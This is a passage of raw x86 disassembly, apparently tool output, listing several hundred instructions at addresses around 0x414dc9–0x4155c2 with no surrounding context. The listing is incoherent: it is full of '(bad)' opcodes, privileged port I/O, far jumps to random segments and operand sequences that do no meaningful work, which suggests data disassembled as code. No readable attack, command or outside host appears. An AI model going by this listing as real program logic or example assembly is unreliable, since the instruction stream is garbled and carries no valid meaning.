  414dc9:	fwait
  414dca:	sub    BYTE PTR [eax-0x65156333],cl
  414dd0:	out    dx,eax
  414dd1:	mov    al,0xc6
  414dd3:	cli    
  414dd4:	add    dl,dh
  414dd6:	xlat   BYTE PTR ds:[ebx]
  414dd7:	lds    esi,FWORD PTR [edi+0x1d]
  414dda:	jp     0x414d93
  414ddc:	mov    DWORD PTR [eax],ebx
  414dde:	test   eax,0x424e5eb5
  414de3:	or     bl,ah
  414de5:	pop    es
  414de6:	sar    DWORD PTR [edx-0x53],cl
  414de9:	test   eax,0x9de832a6
  414dee:	and    ebx,edi
  414df0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414df2:	add    al,0xec
  414df4:	fs stc 
  414df6:	mov    ch,0xdf
  414df8:	shl    ch,cl
  414dfa:	push   ds
  414dfb:	shr    DWORD PTR [eax],cl
  414dfd:	addr16 xchg ecx,eax
  414dff:	dec    ecx
  414e00:	sar    DWORD PTR [esi],cl
  414e02:	or     DWORD PTR [eax+0x1f302fa3],ebx
  414e08:	(bad)  
  414e09:	in     al,dx
  414e0a:	fwait
  414e0b:	add    edx,DWORD PTR [esi+0x7952809f]
  414e11:	sub    bh,dh
  414e13:	out    dx,al
  414e14:	(bad)
  414e18:	repz ds test al,0xad
  414e1c:	(bad)
  414e21:	xchg   ebp,eax
  414e22:	(bad)  
  414e23:	push   esp
  414e24:	test   ecx,ecx
  414e26:	loope  0x414e6e
  414e28:	mov    ebp,0xf66243b
  414e2d:	lods   al,BYTE PTR ds:[esi]
  414e2e:	out    dx,eax
  414e2f:	xchg   ebp,eax
  414e30:	pusha  
  414e31:	push   ds
  414e32:	ret    
  414e33:	add    eax,0xd1057373
  414e38:	pop    esp
  414e39:	ret    0xd011
  414e3c:	addr16 add ch,ch
  414e3f:	out    0x84,al
  414e41:	cmp    eax,0x512b9c44
  414e46:	cmovo  ebp,esi
  414e49:	jae    0x414e90
  414e4b:	fisttp WORD PTR [ecx+0x61c2cdd4]
  414e51:	mov    ah,0xfa
  414e53:	cmp    esp,DWORD PTR [esi+ebp*4-0x1e28416d]
  414e5a:	bound  edx,QWORD PTR [ebp-0x10fe581e]
  414e60:	rcr    DWORD PTR [ebx+0x30],1
  414e63:	enter  0x867,0x5c
  414e67:	add    dl,bh
  414e69:	cld    
  414e6a:	cmp    bh,dh
  414e6c:	imul   esi,DWORD PTR [ebp-0x2012c799],0xffffffd7
  414e73:	jge    0x414e26
  414e75:	loope  0x414e75
  414e77:	sahf   
  414e78:	jl     0x414e27
  414e7a:	popa   
  414e7b:	call   0x8dbd:0x909daa8b
  414e82:	adc    eax,edx
  414e84:	scas   al,BYTE PTR es:[edi]
  414e85:	and    ch,BYTE PTR [edx-0x4d5bbc8c]
  414e8b:	out    dx,al
  414e8c:	ss mov edx,0x760569ec
  414e92:	imul   ebp,DWORD PTR [ecx-0x42],0xa6a4e503
  414e99:	inc    ecx
  414e9a:	jp     0x414ea7
  414e9c:	adc    al,0x2f
  414e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e9f:	jne    0x414e93
  414ea1:	add    al,0x1d
  414ea3:	pop    ebp
  414ea4:	mov    esi,0xd74380ab
  414ea9:	loop   0x414ec5
  414eab:	jnp    0x414eaa
  414ead:	xor    eax,0x361b6611
  414eb2:	sahf   
  414eb3:	addr16 fs out 0x10,al
  414eb7:	pop    eax
  414eb8:	mov    dl,0x9f
  414eba:	loope  0x414ed5
  414ebc:	in     eax,dx
  414ebd:	mov    ds:0xa0357b43,eax
  414ec2:	call   0xd0a62661
  414ec7:	xchg   DWORD PTR [edi-0x412b5272],ebp
  414ecd:	lods   eax,DWORD PTR ds:[esi]
  414ece:	outs   dx,DWORD PTR ds:[esi]
  414ecf:	fadd   st,st(1)
  414ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ed2:	and    dh,BYTE PTR cs:0xde57f470
  414ed9:	jbe    0x414e90
  414edb:	test   al,0x1a
  414edd:	ret    
  414ede:	outs   dx,BYTE PTR ds:[esi]
  414edf:	bound  edx,QWORD PTR [esi]
  414ee1:	push   es
  414ee2:	dec    ecx
  414ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee4:	add    eax,0xb1e30cd9
  414ee9:	push   cx
  414eeb:	push   0x49123937
  414ef0:	cs loopne 0x414e8a
  414ef3:	(bad)  
  414ef5:	cmp    edi,DWORD PTR [esi-0x7ead632c]
  414efb:	and    BYTE PTR [edi],al
  414efd:	mov    al,0x56
  414eff:	xor    eax,0x99e5dce2
  414f04:	dec    esp
  414f05:	pop    es
  414f06:	retf   0xfeaa
  414f09:	imul   edx,DWORD PTR [eax+0x534ddd20],0x3b927e74
  414f13:	call   0x94ee:0x336a8789
  414f1a:	and    ch,BYTE PTR ds:0xe93b8de2
  414f20:	ret    0x241b
  414f23:	int    0x4f
  414f25:	sub    ebp,DWORD PTR [ebx+0x4c]
  414f28:	mov    WORD PTR [edi+0x11],ss
  414f2b:	mov    eax,ds:0x32a690b9
  414f30:	dec    ebx
  414f31:	lea    eax,[ecx-0x6c]
  414f34:	add    al,0x25
  414f36:	mov    ebx,0x28d34c30
  414f3b:	fidiv  WORD PTR [eax-0xc]
  414f3e:	retf   
  414f3f:	and    DWORD PTR [ebx-0x32],0x1e
  414f43:	int3   
  414f44:	mov    bl,BYTE PTR ds:0x5e1219c5
  414f4a:	or     ch,BYTE PTR ds:0xd0134450
  414f50:	jmp    0x8583f0fd
  414f55:	jg     0x414f81
  414f57:	in     eax,dx
  414f58:	mov    ah,0xf9
  414f5a:	xchg   DWORD PTR [ebp+0x2d],ecx
  414f5d:	sahf   
  414f5e:	xor    eax,0x4f7867c6
  414f63:	mov    ?,WORD PTR [edx+0x6ab4e915]
  414f69:	xchg   ecx,eax
  414f6a:	push   eax
  414f6b:	ja     0x414f39
  414f6d:	xchg   BYTE PTR [ebx+edx*8+0x157877ba],bh
  414f74:	das    
  414f75:	jg     0x414fbc
  414f77:	mov    edx,0x453134f8
  414f7c:	out    dx,al
  414f7d:	data16 (bad) 
  414f7f:	xor    esi,DWORD PTR [ebp-0x31e03361]
  414f85:	mov    dl,0xcd
  414f87:	js     0x414fc5
  414f89:	retf   
  414f8a:	sbb    eax,0x709a4977
  414f8f:	adc    BYTE PTR [esi+ebp*8],bh
  414f92:	ins    BYTE PTR es:[edi],dx
  414f93:	pushf  
  414f94:	sbb    BYTE PTR [ebx+0x4d],dh
  414f97:	stos   BYTE PTR es:[edi],al
  414f98:	movsx  ecx,BYTE PTR [ebx]
  414f9b:	mov    eax,ss
  414f9d:	sbb    edi,edi
  414f9f:	cmp    BYTE PTR [edi-0x76817205],ch
  414fa5:	inc    eax
  414fa6:	jae    0x414fe8
  414fa8:	aas    
  414fa9:	(bad)  
  414fab:	lahf   
  414fac:	ins    BYTE PTR es:[edi],dx
  414fad:	int3   
  414fae:	mov    dh,0xf6
  414fb0:	leave  
  414fb1:	add    eax,0xdead36e9
  414fb6:	push   edx
  414fb7:	push   eax
  414fb8:	das    
  414fb9:	scas   eax,DWORD PTR es:[edi]
  414fba:	jnp    0x414f59
  414fbc:	in     al,0x9e
  414fbe:	addr16 test eax,0x7d2a8ea9
  414fc4:	loope  0x41501b
  414fc6:	imul   ebx,DWORD PTR [ebp-0x30],0xc
  414fca:	or     eax,0x5e4b6575
  414fcf:	pop    ebp
  414fd0:	(bad)  
  414fd1:	retf   
  414fd2:	dec    ebx
  414fd3:	mov    bh,0x5a
  414fd5:	shl    ebp,0x20
  414fd8:	dec    ebx
  414fd9:	jle    0x414fa7
  414fdb:	test   al,dh
  414fdd:	stos   DWORD PTR es:[edi],eax
  414fde:	stc    
  414fdf:	into   
  414fe0:	adc    DWORD PTR [esi-0x164ef721],edi
  414fe6:	jnp    0x414fa1
  414fe8:	jecxz  0x414f71
  414fea:	sti    
  414feb:	pop    es
  414fec:	push   ecx
  414fed:	sub    eax,0xd5f8269d
  414ff2:	loop   0x415057
  414ff4:	jno    0x414fde
  414ff6:	popa   
  414ff7:	cs inc ecx
  414ff9:	mov    eax,eax
  414ffb:	and    DWORD PTR [esi+0x30cc11cd],ecx
  415001:	hlt    
  415002:	pop    ebp
  415003:	sbb    dh,BYTE PTR [eax]
  415005:	neg    DWORD PTR [ebx+0x4a]
  415008:	bound  edi,QWORD PTR [edi]
  41500a:	push   cs
  41500b:	push   0xd4865b36
  415010:	imul   eax,DWORD PTR [ebp-0x7a],0x565705c3
  415017:	icebp  
  415018:	out    0x4b,al
  41501a:	shl    cl,0xd3
  41501d:	or     BYTE PTR [esi+ebx*4+0x270aa6a1],ch
  415024:	(bad)  
  415025:	pushf  
  415026:	fild   DWORD PTR [ebx-0x4d8f6ee6]
  41502c:	stc    
  41502d:	loopne 0x415014
  41502f:	ss xor al,0x18
  415032:	add    dh,BYTE PTR [eax-0x3ef85147]
  415038:	mov    dl,0x64
  41503a:	mov    esi,0x7f68b493
  41503f:	cs jp  0x415072
  415042:	sub    eax,0x802b0f3c
  415047:	sbb    BYTE PTR [ebx-0x5],ch
  41504a:	push   edx
  41504b:	xor    ah,dl
  41504d:	cmp    ch,dl
  41504f:	inc    ebx
  415050:	aam    0xec
  415052:	pop    eax
  415053:	leave  
  415054:	icebp  
  415055:	inc    edx
  415056:	adc    DWORD PTR [eax+0x63d5f20a],esi
  41505c:	aaa    
  41505d:	or     eax,0x96830081
  415062:	aaa    
  415063:	mov    fs,WORD PTR [edx+0x135067af]
  415069:	ins    DWORD PTR es:[edi],dx
  41506a:	loope  0x415077
  41506c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41506d:	and    bl,ah
  41506f:	xor    ebx,DWORD PTR [edi-0x13]
  415072:	xchg   ecx,eax
  415073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415074:	and    al,dl
  415076:	and    DWORD PTR ds:0x8ecfdd4e,eax
  41507c:	cli    
  41507d:	cmp    cl,BYTE PTR [esi]
  41507f:	inc    edi
  415080:	ss dec edi
  415082:	sub    eax,0x678e21c4
  415087:	inc    ebx
  415088:	std    
  415089:	xor    al,0x48
  41508b:	inc    esi
  41508c:	mov    al,ss:0xb1146645
  415092:	das    
  415093:	fcompp 
  415095:	add    al,0x1d
  415097:	out    0xb0,al
  415099:	mov    edx,0x1447e387
  41509e:	mov    al,ds:0x516cc8c3
  4150a3:	pushf  
  4150a4:	int3   
  4150a5:	rcl    DWORD PTR [ecx+0x31],1
  4150a8:	mov    dh,0xa0
  4150aa:	push   ebx
  4150ab:	mov    cs,WORD PTR [ecx]
  4150ad:	pop    esi
  4150ae:	adc    DWORD PTR [eax+edx*8+0x72],ebx
  4150b2:	and    DWORD PTR ds:0x4a0da34a,ebp
  4150b8:	pop    ebp
  4150b9:	and    al,0x59
  4150bb:	inc    edi
  4150bc:	sub    DWORD PTR [esi-0x40],0x7867e821
  4150c3:	and    edi,edi
  4150c5:	and    dh,cl
  4150c7:	je     0x41504c
  4150c9:	fdiv   DWORD PTR [eax+0x3de2a8d2]
  4150cf:	add    DWORD PTR [eax-0x5f],ebp
  4150d2:	xchg   edi,eax
  4150d3:	jb     0x415057
  4150d5:	(bad)  
  4150d6:	adc    DWORD PTR [ecx],esp
  4150d8:	jne    0x4150ae
  4150da:	adc    bx,WORD PTR [ecx]
  4150dd:	cmp    ecx,ebx
  4150df:	(bad)  
  4150e0:	sbb    DWORD PTR [edi],esi
  4150e2:	sbb    eax,ebx
  4150e4:	inc    eax
  4150e5:	js     0x4150d9
  4150e7:	mov    ds:0xbe7ebc4c,eax
  4150ec:	test   BYTE PTR [edi+0x3b],bl
  4150ef:	jmp    0xd84105d3
  4150f4:	jo     0x4150ff
  4150f6:	add    BYTE PTR [ebx],dh
  4150f8:	(bad)  
  4150f9:	cs retf 0xdcb0
  4150fd:	pop    eax
  4150fe:	inc    ebx
  4150ff:	pushf  
  415100:	cmp    ebp,DWORD PTR [ecx+0x2332133c]
  415106:	int3   
  415107:	repz or al,0x77
  41510a:	fs jle 0x4150a2
  41510d:	pop    edx
  41510e:	xchg   BYTE PTR [ebx-0x30],ah
  415111:	mov    dl,BYTE PTR [ecx-0x1d]
  415114:	adc    al,0x28
  415116:	add    ebp,ecx
  415118:	daa    
  415119:	lahf   
  41511a:	mov    ds:0xfc9f391c,al
  41511f:	push   ebx
  415120:	stos   DWORD PTR es:[edi],eax
  415121:	sbb    eax,0xfa064ae7
  415126:	daa    
  415127:	lea    edx,[ebx]
  415129:	out    dx,al
  41512a:	outs   dx,DWORD PTR ds:[esi]
  41512b:	hlt    
  41512c:	jmp    0x44c38941
  415131:	leave  
  415132:	loop   0x41513a
  415134:	jp     0x41515b
  415136:	aam    0xea
  415138:	sar    dl,0xa
  41513b:	fsubr  DWORD PTR [ecx+0x68]
  41513e:	dec    ecx
  41513f:	sbb    DWORD PTR [ebp+0x397fa8e1],edi
  415145:	leave  
  415146:	push   0x7ba312a6
  41514b:	or     DWORD PTR [eax],esp
  41514d:	pop    es
  41514e:	sub    eax,0x5cf38f3f
  415153:	add    al,0x28
  415155:	mov    esi,0xcd7b82e3
  41515a:	loopne 0x415153
  41515c:	lods   eax,DWORD PTR ds:[esi]
  41515d:	mov    ch,0x3a
  41515f:	fdivr  QWORD PTR [eax-0x43]
  415162:	mov    ch,0xbd
  415164:	std    
  415165:	sbb    DWORD PTR [esi],esi
  415167:	(bad)  
  415168:	div    DWORD PTR [esi+0x3fd431e7]
  41516e:	xchg   ecx,eax
  41516f:	loopne 0x4151a2
  415171:	xchg   edx,eax
  415172:	gs call 0xfa51954b
  415178:	pop    ebp
  415179:	xlat   BYTE PTR ds:[ebx]
  41517a:	pop    ebx
  41517b:	leave  
  41517c:	xchg   edx,eax
  41517d:	mov    edi,0x404b3ea1
  415182:	inc    ebx
  415183:	call   0xe2a6f1ee
  415188:	dec    eax
  415189:	popf   
  41518a:	ds enter 0x988f,0xf9
  41518f:	sbb    ebx,DWORD PTR [edi]
  415191:	pop    esp
  415192:	mov    eax,0xbc1875c7
  415197:	xchg   ebx,eax
  415198:	lods   eax,DWORD PTR ds:[esi]
  415199:	jmp    0x86d0d651
  41519e:	pop    ss
  41519f:	jl     0x4151c1
  4151a1:	mov    cl,BYTE PTR [edi+0x26925e1e]
  4151a7:	push   esi
  4151a8:	loop   0x4151e0
  4151aa:	mov    ds:0xde527770,al
  4151af:	sar    dh,cl
  4151b1:	jmp    0xab62:0xe9c0999
  4151b8:	jnp    0x415186
  4151ba:	dec    ecx
  4151bb:	jg     0x415148
  4151bd:	sbb    eax,0x8fede2ec
  4151c2:	inc    ebx
  4151c3:	inc    ebx
  4151c4:	sub    al,0x81
  4151c6:	ss jbe 0x4151af
  4151c9:	inc    edi
  4151ca:	je     0x415196
  4151cc:	jbe    0x41519d
  4151ce:	or     bh,bl
  4151d0:	imul   esi,DWORD PTR [esp+esi*2-0x37],0x8a6a96fa
  4151d8:	push   esp
  4151d9:	pop    edx
  4151da:	push   ds
  4151db:	dec    edx
  4151dc:	dec    ebp
  4151dd:	jo     0x4151f3
  4151df:	push   es
  4151e0:	sti    
  4151e1:	fsub   st,st(5)
  4151e3:	jmp    0xdf37882e
  4151e8:	xor    esi,DWORD PTR [ebp-0x2f]
  4151eb:	in     eax,dx
  4151ec:	push   eax
  4151ed:	xchg   ecx,eax
  4151ee:	jae    0x4151cf
  4151f0:	sbb    ah,BYTE PTR [ebx]
  4151f2:	aaa    
  4151f3:	stos   DWORD PTR es:[edi],eax
  4151f4:	pop    ss
  4151f5:	mov    edx,0xffe3be2d
  4151fa:	cmp    eax,0xc4d9213c
  4151ff:	and    edi,edi
  415201:	inc    esp
  415202:	and    al,0x59
  415204:	es inc ebx
  415206:	out    0x61,eax
  415208:	arpl   bx,ax
  41520a:	push   ecx
  41520b:	or     eax,0x83c8cbd5
  415210:	mov    ecx,0xb8e5b662
  415215:	cmp    al,0x64
  415217:	dec    esp
  415218:	outs   dx,DWORD PTR ds:[esi]
  415219:	inc    ebp
  41521a:	pop    eax
  41521b:	test   al,0x2f
  41521d:	push   es
  41521e:	jo     0x415272
  415220:	out    dx,al
  415221:	sub    ecx,ebx
  415223:	fcom   DWORD PTR [ecx+0x3a2b895f]
  41522a:	out    0x94,al
  41522c:	xchg   esi,ebx
  41522e:	sub    cl,bh
  415230:	aam    0x6d
  415232:	jp     0x415236
  415234:	pop    ebp
  415235:	push   ss
  415236:	je     0x4151fc
  415238:	push   ss
  415239:	fcomip st,st(5)
  41523b:	lods   eax,DWORD PTR ds:[esi]
  41523c:	hlt    
  41523d:	sbb    eax,esp
  41523f:	or     esi,DWORD PTR [edx-0xc]
  415242:	jmp    0x4152c0
  415244:	cmc    
  415245:	mov    ch,0xb7
  415247:	adc    BYTE PTR [edi-0x72],dl
  41524a:	fst    DWORD PTR [eax+eax*1+0x5ae68966]
  415251:	lea    ebp,[eax-0x65]
  415254:	and    bh,dh
  415256:	sub    ebp,DWORD PTR [esp+esi*4]
  415259:	sub    DWORD PTR [ecx],ecx
  41525b:	xchg   ebx,eax
  41525c:	xchg   ecx,eax
  41525d:	pusha  
  41525e:	mov    gs,edx
  415260:	and    eax,0x61c965a0
  415265:	push   es
  415266:	sbb    BYTE PTR [ecx+0x4f],bh
  415269:	call   0xe70e2c7c
  41526e:	rcr    DWORD PTR [edx],cl
  415270:	scas   eax,DWORD PTR es:[edi]
  415271:	in     eax,0xd2
  415273:	ds out 0xe3,eax
  415276:	xbegin 0xb351e11c
  41527c:	push   esi
  41527d:	jmp    0x75bd:0xc00003f2
  415284:	adc    ch,BYTE PTR [ecx+ecx*2+0x1f5646e1]
  41528b:	xor    al,0xf9
  41528d:	mov    edx,0x53a66ba9
  415292:	rcr    al,0x68
  415295:	les    bx,DWORD PTR [edi]
  415298:	icebp  
  415299:	out    0x6d,al
  41529b:	sahf   
  41529c:	and    eax,0x6815516
  4152a1:	inc    esp
  4152a2:	adc    dh,BYTE PTR [edx]
  4152a4:	stos   BYTE PTR es:[edi],al
  4152a5:	call   DWORD PTR [edx-0x63]
  4152a8:	scas   eax,DWORD PTR es:[edi]
  4152a9:	aaa    
  4152aa:	mov    ebp,0xfca011ae
  4152af:	js     0x4152ae
  4152b1:	cli    
  4152b2:	ins    BYTE PTR es:[edi],dx
  4152b3:	outs   dx,DWORD PTR ds:[esi]
  4152b4:	mov    bl,bh
  4152b6:	xchg   BYTE PTR [ebp+0x39],ch
  4152b9:	jp     0x41528a
  4152bb:	pop    edi
  4152bc:	imul   esi,DWORD PTR [edx-0x51],0xffffffde
  4152c0:	mov    cl,0x83
  4152c2:	je     0x4152a6
  4152c4:	add    DWORD PTR ds:0x7fdd50f7,edx
  4152ca:	or     BYTE PTR [esi+0x6280e23f],ah
  4152d0:	lahf   
  4152d1:	add    ecx,DWORD PTR [edx+eax*2+0x7f672ec7]
  4152d8:	mov    ebp,0x1262cc29
  4152dd:	or     edx,edx
  4152df:	pop    ds
  4152e0:	cmp    DWORD PTR [edx-0x1b1c41],ebx
  4152e6:	inc    ebx
  4152e7:	jbe    0x4152d7
  4152e9:	push   ss
  4152ea:	or     edi,esi
  4152ec:	mov    dh,0xe9
  4152ee:	jb     0x415346
  4152f0:	xchg   ebx,eax
  4152f1:	jmp    0xbe0be7fd
  4152f6:	xchg   edx,eax
  4152f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152f8:	cmp    DWORD PTR [eax+0x65],esp
  4152fb:	adc    esp,DWORD PTR [edi-0x735f8e09]
  415301:	inc    esi
  415302:	push   es
  415303:	test   DWORD PTR [edi+0x1dfe02ca],esp
  415309:	and    cl,BYTE PTR [eax+0x6f]
  41530c:	stos   BYTE PTR es:[edi],al
  41530d:	outs   dx,BYTE PTR ds:[esi]
  41530e:	xchg   edi,eax
  41530f:	add    BYTE PTR [ecx+0x37],bh
  415312:	cmc    
  415313:	xor    al,BYTE PTR [eax-0x360e4652]
  415319:	sub    al,0xd1
  41531b:	pop    eax
  41531c:	or     eax,0x51ccab84
  415321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415322:	not    DWORD PTR [eax]
  415324:	loope  0x41539e
  415326:	ins    DWORD PTR es:[edi],dx
  415327:	pop    ds
  415328:	cdq    
  415329:	(bad)  
  41532a:	mov    ds:0x722b287c,al
  41532f:	leave  
  415330:	sub    DWORD PTR [ecx-0x21],ecx
  415333:	sbb    al,0x74
  415335:	sub    eax,DWORD PTR [edi-0x7ad691d6]
  41533b:	das    
  41533c:	lds    eax,FWORD PTR [edx-0x378b8d40]
  415342:	shr    ebx,cl
  415344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415345:	push   edx
  415346:	inc    edx
  415347:	or     BYTE PTR [eax+ebp*1+0x4dc61116],0xf
  41534f:	inc    esp
  415350:	popf   
  415351:	loope  0x4152de
  415353:	sub    edi,eax
  415355:	mov    bh,0x99
  415357:	sti    
  415358:	mov    ah,BYTE PTR [ecx]
  41535a:	daa    
  41535b:	mov    edi,0x9e6d2b9a
  415360:	and    esp,DWORD PTR [ecx-0x72ab10d2]
  415366:	or     dl,BYTE PTR [edi-0x5a5574ff]
  41536c:	scas   al,BYTE PTR es:[edi]
  41536d:	pop    ebp
  41536e:	pop    ss
  41536f:	dec    edx
  415370:	fadd   DWORD PTR [eiz*8+0x3e370eeb]
  415377:	(bad)  
  415378:	ss mov bl,0xf9
  41537b:	cld    
  41537c:	push   ecx
  41537d:	mov    ds:0xc189d704,eax
  415382:	xor    eax,DWORD PTR [ebx+0x51]
  415385:	stos   DWORD PTR es:[edi],eax
  415386:	mov    bl,BYTE PTR [ebx+ecx*2-0x45]
  41538a:	mov    bh,0xc6
  41538c:	stos   DWORD PTR es:[edi],eax
  41538d:	(bad)  
  41538e:	clc    
  41538f:	fdivr  QWORD PTR [esi-0x19d4d3eb]
  415395:	repnz push edi
  415397:	mov    dh,0x80
  415399:	mov    dh,BYTE PTR [eax]
  41539b:	dec    eax
  41539c:	mov    cl,0xa4
  41539e:	je     0x41538d
  4153a0:	sbb    eax,0x9135cb78
  4153a5:	lock cdq 
  4153a7:	pop    ecx
  4153a8:	push   ecx
  4153a9:	gs std 
  4153ab:	clc    
  4153ac:	js     0x415398
  4153ae:	pop    ebx
  4153af:	jmp    0x4aac:0xca841bf
  4153b6:	lock ss sbb edi,0xffffffa5
  4153bb:	xor    esp,DWORD PTR [eax+0x20]
  4153be:	mov    ch,0x89
  4153c0:	xchg   edx,eax
  4153c1:	fnstenv [esi-0x1dd38697]
  4153c7:	inc    ebx
  4153c8:	lods   eax,DWORD PTR ds:[esi]
  4153c9:	mov    WORD PTR [esi],?
  4153cb:	pop    ebx
  4153cc:	retf   
  4153cd:	ins    BYTE PTR es:[edi],dx
  4153ce:	mov    esp,0x4fd3c8aa
  4153d3:	mov    BYTE PTR [eax-0x27],ch
  4153d6:	mov    cl,0x44
  4153d8:	mov    al,0x89
  4153da:	sahf   
  4153db:	dec    esi
  4153dc:	or     eax,0xd4309bac
  4153e1:	cmp    eax,0x8df7b7a7
  4153e6:	es ins BYTE PTR es:[edi],dx
  4153e8:	add    ch,BYTE PTR [edi]
  4153ea:	push   esp
  4153eb:	stos   BYTE PTR es:[edi],al
  4153ec:	lds    esi,FWORD PTR [edi+edi*8]
  4153ef:	inc    ebx
  4153f0:	fidivr DWORD PTR [ebx]
  4153f2:	clc    
  4153f3:	xor    edx,ecx
  4153f5:	and    eax,0x1fa21523
  4153fa:	add    dh,bl
  4153fc:	std    
  4153fd:	mov    bh,0xd3
  4153ff:	les    edi,FWORD PTR [ebx]
  415401:	xor    BYTE PTR [ebx],dh
  415403:	jnp    0x41538a
  415405:	xchg   edx,eax
  415406:	mov    esp,0x9986d5b1
  41540b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41540c:	fisubr DWORD PTR [ebx+0x22f8e0c3]
  415412:	jmp    0x24cbdc7
  415417:	retf   0xc471
  41541a:	add    eax,0x14
  41541d:	xchg   ebx,eax
  41541e:	adc    al,0xf9
  415420:	pop    edx
  415421:	adc    eax,0x443e5593
  415426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415427:	ss xchg ecx,eax
  415429:	dec    esi
  41542a:	popa   
  41542b:	adc    eax,0xb01d47fd
  415430:	add    ah,dl
  415432:	fild   DWORD PTR [edx+0x2]
  415435:	jp     0x415498
  415437:	jmp    0x4fc0:0xfdeeeae3
  41543e:	or     esi,ebp
  415440:	mov    ah,0xf5
  415442:	icebp  
  415443:	mov    ds:0x1953adb7,eax
  415448:	sub    BYTE PTR [ebx+0x55],ch
  41544b:	mov    bl,0xb3
  41544d:	aad    0x31
  41544f:	call   0x6861332c
  415454:	test   eax,0xa2e0d595
  415459:	push   cs
  41545a:	pop    ebx
  41545b:	mov    ecx,0xa0f1cf6d
  415460:	inc    eax
  415461:	mov    eax,ds:0x633f5135
  415466:	push   0xffffff80
  415468:	or     DWORD PTR [edx+0x48f508a6],ebx
  41546e:	clc    
  41546f:	adc    ebx,DWORD PTR [esi-0x3d]
  415472:	inc    edi
  415473:	dec    esp
  415474:	push   ss
  415475:	test   eax,0x67e8b3e6
  41547a:	sahf   
  41547b:	mov    esp,0x418407a2
  415480:	aad    0xf1
  415482:	xchg   esp,esi
  415484:	fist   DWORD PTR [eax+0x66f66be7]
  41548a:	sub    ch,ch
  41548c:	out    0x36,al
  41548e:	sar    DWORD PTR [ebx],0x3e
  415491:	and    BYTE PTR [esp+esi*8],bh
  415494:	lahf   
  415495:	loopne 0x41545c
  415497:	add    eax,0x2af7000
  41549c:	(bad)  
  41549d:	adc    bl,BYTE PTR [ecx-0x8]
  4154a0:	(bad)  
  4154a1:	xor    ecx,esp
  4154a3:	push   esp
  4154a4:	cld    
  4154a5:	xor    DWORD PTR [esi+esi*8],0xfe36e79f
  4154ac:	dec    edx
  4154ad:	push   cs
  4154ae:	adc    eax,0xb8e2a52c
  4154b3:	data16 jge 0x41551d
  4154b6:	(bad)  [edx+0x2efa68bd]
  4154bc:	mov    ah,0xc3
  4154be:	test   al,0x3
  4154c0:	(bad)  
  4154c1:	lds    edx,FWORD PTR [ebp-0x2ef3b75d]
  4154c7:	or     ebx,DWORD PTR [ecx+0x33]
  4154ca:	mov    cl,0x96
  4154cc:	dec    edi
  4154cd:	fwait
  4154ce:	pop    ss
  4154cf:	clc    
  4154d0:	dec    ecx
  4154d1:	mov    ds:0x6bed099e,eax
  4154d6:	sub    ecx,DWORD PTR es:[ecx-0x401cf2e6]
  4154dd:	dec    eax
  4154de:	fisubr WORD PTR [edx+ebx*2+0x7153b19d]
  4154e5:	mov    eax,ds:0xd3c0c0c7
  4154ea:	mov    cl,0x51
  4154ec:	mov    edi,0xecc71688
  4154f1:	add    DWORD PTR gs:[edx],esi
  4154f4:	xchg   ecx,eax
  4154f5:	sti    
  4154f6:	adc    ebp,DWORD PTR [eax+0x49c21b73]
  4154fc:	adc    BYTE PTR [eax-0x6f],dh
  4154ff:	push   ds
  415500:	cmp    al,0xe8
  415502:	cli    
  415503:	mov    al,ds:0x139ce6bb
  415508:	jbe    0x4154e5
  41550a:	sub    al,0x89
  41550c:	rcr    BYTE PTR [edi+0x10],0x2d
  415510:	xchg   esi,eax
  415511:	or     eax,esi
  415513:	jge    0x4154d1
  415515:	push   ss
  415516:	or     eax,DWORD PTR [ecx+0x65]
  415519:	jnp    0x4154ba
  41551b:	or     eax,DWORD PTR [edx-0x68]
  41551e:	call   DWORD PTR [esi+0x1373a6e7]
  415524:	je     0x415539
  415526:	add    al,0x63
  415528:	test   BYTE PTR [edx+0x29],al
  41552b:	js     0x4154ec
  41552d:	pop    esp
  41552e:	dec    ebx
  41552f:	test   BYTE PTR [eax+0x50],0x81
  415533:	or     DWORD PTR [edi+0x1e17d5a7],ecx
  415539:	icebp  
  41553a:	jno    0x4154fe
  41553c:	dec    esi
  41553d:	pop    esi
  41553e:	or     bh,dh
  415540:	mov    edi,0x17e8d962
  415545:	jae    0x4154fc
  415547:	jns    0x4155af
  415549:	sbb    al,0xb6
  41554b:	inc    edi
  41554c:	loopne 0x4155ad
  41554e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41554f:	leave  
  415550:	jmp    0x415554
  415552:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415555:	jmp    0x5269f656
  41555a:	(bad)  
  41555b:	pop    edi
  41555c:	jnp    0x415501
  41555e:	mov    ah,0xfa
  415560:	xor    eax,0xf845f2f9
  415565:	lahf   
  415566:	in     al,dx
  415567:	or     bh,BYTE PTR [ebx-0x32]
  41556a:	xlat   BYTE PTR ds:[ebx]
  41556b:	mov    esp,0x4580736f
  415570:	sub    al,0xdc
  415572:	inc    ebp
  415573:	test   eax,0xfe596c4d
  415578:	lds    esi,FWORD PTR [edi+0x25]
  41557b:	or     DWORD PTR [edi+0x338bd883],edx
  415581:	(bad)  
  415582:	test   BYTE PTR [ebx],0xd0
  415585:	push   ds
  415586:	mov    ch,0x72
  415588:	push   0xe
  41558a:	xchg   esp,eax
  41558b:	jl     0x415600
  41558d:	and    BYTE PTR [ebp+0x7cdce757],ah
  415593:	clc    
  415594:	push   edi
  415595:	add    eax,0x83afa763
  41559a:	mov    ebx,0x6dcd0a06
  41559f:	pushf  
  4155a0:	xchg   edx,eax
  4155a1:	push   0x32949c78
  4155a6:	push   es
  4155a7:	lahf   
  4155a8:	xor    al,0x75
  4155aa:	push   0x43e09393
  4155af:	jno    0x4155ee
  4155b1:	or     eax,0x46cba049
  4155b6:	adc    eax,0xed7ee055
  4155bb:	pop    ebp
  4155bc:	arpl   WORD PTR [esi+0x1b69896b],bp
  4155c2:	clc    
